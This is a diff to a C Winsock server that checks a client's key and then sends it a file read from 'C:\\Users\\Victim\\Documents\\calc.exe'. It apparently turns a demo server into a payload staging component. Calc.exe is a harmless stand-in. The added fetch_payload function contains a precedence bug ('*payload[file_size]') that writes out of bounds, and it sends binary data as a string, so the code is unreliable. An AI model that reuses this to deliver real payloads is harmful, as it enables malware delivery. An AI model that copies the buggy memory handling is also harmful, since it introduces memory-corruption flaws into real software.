@@ -5,13 +5,15 @@
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <stdio.h>
+#include <stdlib.h>
 #include <string.h>
+#include <errno.h>
 
 #pragma comment(lib, "ws2_32.lib")
 
 const unsigned int KEY_SIZE = 15;
 const char* KEY = "This is a test!";
-const char* DATA = "This is data only for validated clients.";
+const char* payload_path = "C:\\Users\\Victim\\Documents\\calc.exe";
 const size_t PREFIX_SIZE = 4;
 
 
@@ -169,6 +171,55 @@ int receive_and_validate_key(SOCKET client_socket, const char* expected_key, siz
 	return validation_result;
 }
 
+int fetch_payload(char** payload)
+{
+	printf("[i] Openeing file.\n");
+	// Open the file in binary mode
+	FILE *fp = fopen(payload_path, "rb");
+
+    if (fp == NULL)
+    {
+        fprintf(stderr, "[!] fopen() failed. Error code: %d (%s)\n", errno, strerror(errno));
+        return 1; // Or a custom error code
+    }
+
+	printf("[i] Seeking.\n");
+	// Get file size
+	fseek(fp, 0, SEEK_END);
+	long file_size = ftell(fp);
+	fseek(fp, 0, SEEK_SET); 
+
+	printf("[i] Allocating memory.\n");
+	// Allocate memory for the file contents
+	*payload = (char *)malloc(file_size + 1);
+
+	if (*payload == NULL)
+	{
+		fprintf(stderr, "[!] malloc() failed.\n");
+		fclose(fp);
+		return 1;
+	}
+
+	printf("[i] Reading bytes into buffer.\n");
+	// Read the file contents into the payload buffer
+	size_t bytes_read = fread(*payload, 1, file_size, fp);
+
+	if (bytes_read != file_size)
+	{
+		fprintf(stderr, "[!] fread() failed.\n");
+		free(*payload);
+		fclose(fp);
+		return 1;
+	}
+
+	printf("[i] Setting null character.\n");
+	// Ensure null termination
+	*payload[file_size] = '\0';
+
+	fclose(fp);
+	return 0;
+}
+
 int prepare_message(
 	const char* raw_message,
 	size_t raw_message_size,
@@ -257,11 +308,20 @@ int main(void)
 		return 1;
 	}
 
-	if (send_data(client_socket, DATA) != 0) {
+	char* payload = NULL;
+	if (fetch_payload(&payload) != 0)
+	{
+		fprintf(stderr, "[!] fetch_payload() failed.\n");
+		return 1;
+	}
+
+	if (send_data(client_socket, payload) != 0) {
+		free(payload);
 		cleanup(listening_socket, client_socket);
 		return 1;
 	}
 
+	free(payload);
 	cleanup(listening_socket, client_socket);
 	return 0;
 }
